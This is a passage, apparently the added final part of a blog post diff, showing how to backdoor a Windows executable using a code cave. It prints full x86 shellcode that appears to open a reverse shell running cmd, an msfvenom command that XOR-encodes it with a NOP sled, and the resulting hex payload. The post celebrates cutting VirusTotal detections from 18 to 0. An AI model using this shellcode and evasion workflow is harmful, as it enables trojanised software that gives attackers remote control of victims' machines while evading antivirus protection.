@@ -245,3 +245,54 @@ Last section of the payload before decoding.
 After decoding.
 
 ![](/assets/img/Code_Cave_II/28.png)
+
+Interesting, our JMP no longer points to 0040342B. Instead, it directs the flow to 0040345C. With this configuration, our backdoor will never work properly! Let's make some modifications.
+
+![](/assets/img/Code_Cave_II/29.png)
+
+As seen on the image, the second opcode of the JMP, BA, has been replaced for 89, meaning that this is the byte that should be replaced in our custom.py.
+
+Python script (the only arranged change is at the last line):
+
+```term
+root@whitecr0wz:~# cat custom.py 
+
+shellcode = (
+
+"\x60\x9C\xFC\xE8\x82\x00\x00\x00\x60\x89\xE5\x31\xC0\x64\x8B\x50\x30\x8B\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF2\x52\x57\x8B\x52\x10\x8B\x4A\x3C\x8B\x4C\x11\x78\xE3\x48\x01\xD1\x51\x8B\x59\x20\x01\xD3\x8B\x49\x18\xE3\x3A\x49\x8B\x34\x8B\x01\xD6\x31\xFF\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF6\x03\x7D\xF8\x3B\x7D\x24\x75\xE4\x58\x8B\x58\x24\x01\xD3\x66\x8B\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x5F\x5F\x5A\x8B\x12\xEB\x8D\x5D\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x68\x4C\x77\x26\x07\xFF\xD5\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x68\x29\x80\x6B\x00\xFF\xD5\x6A\x08\x59\x50\xE2\xFD\x40\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xFF\xD5\x97\x68\x02\x00\x23\x28\x89\xE6\x6A\x10\x56\x57\x68\xC2\xDB\x37\x67\xFF\xD5\x57\x68\xB7\xE9\x38\xFF\xFF\xD5\x57\x68\x74\xEC\x3B\xE1\xFF\xD5\x57\x97\x68\x75\x6E\x4D\x61\xFF\xD5\x68\x63\x6D\x64\x00\x89\xE3\x57\x57\x57\x31\xF6\x6A\x12\x59\x56\xE2\xFD\x66\xC7\x44\x24\x3C\x01\x01\x8D\x44\x24\x10\xC6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4E\x56\x56\x53\x56\x68\x79\xCC\x3F\x86\xFF\xD5\x89\xE0\x90\x56\x46\xFF\x30\x68\x08\x87\x1D\x60\xFF\xD5\xBB\xF0\xB5\xA2\x56\x68\xA6\x95\xBD\x9D\xFF\xD5\x3C\x06\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\x81\xC4\x00\x02\x00\x00\x9D\x61\x68\xB8\x7F\x49\x00\xE9\x89\xF0\xF5\xFF"
+
+)
+
+print (shellcode)
+root@whitecr0wz:~# 
+```
+
+Generating the payload once again:
+
+```term
+root@whitecr0wz:~# python custom.py | msfvenom -p - --platform windows -a x86 -e x86/xor_dynamic -n 5 -f hex 
+Attempting to read payload from STDIN...
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of x86/xor_dynamic
+x86/xor_dynamic succeeded with size 393 (iteration=0)
+x86/xor_dynamic chosen with final size 393
+Successfully added NOP sled of size 5 from x86/single_byte
+Payload size: 398 bytes
+Final size of hex file: 796 bytes
+f5982f933feb235b89dfb052fcae75fd89f989de8a0630074766813f723c740846803e5275eeebeaffe1e8d8ffffff275247bbdbcfa527272747aec216e743ac7717ac752bac7533ac550f28906d0116d88b1b465b250b07e6e82a26e0c5d57570ac7537ac6d1bac6b365fc46f26f676ac7e0726f4ac6e3fc41d6eac13ac26f116d88be6e82a26e01fc752d1245adf1c5a0352c37fac7f0326f441ac2b6cac7f3b26f4ac23ac26f7ae6303037c7c467e7d76d8c778787dac35ccaa7a4f141527274f50541578734f6b500120d8f29fb72627270ee373774f0ea74c27d8f24d2f7e77c5da677767774fcd28f8c7d8f2b04f2527040faec14d3771704fe5fc1040d8f2704f90ce1fd8d8f2704f53cb1cc6d8f270b04f52496a46d8f24f444a4327aec470707016d14d357e71c5da41e063031b2626aa630337e127637377717171617169717174714f5eeb18a1d8f2aec7b77161d8174f2fa03a47d8f29cd79285714f81b29abad8f21b215b2da7dcc752229c603455484d2774a6e327252727ba464f9f586e27ceaed7d2d82d723c
+root@whitecr0wz:~# 
+```
+
+Let's repeat the previous process and save.
+
+![](/assets/img/Code_Cave_II/30.png)
+
+#### EndGame #2
+
+![](/assets/img/Code_Cave_II/31.gif)
+
+VirusTotal results:
+
+![](/assets/img/Code_Cave_II/32.png)
+
+From 18 to 0! This is beyond impressive! Thank you for reading this blog post! 
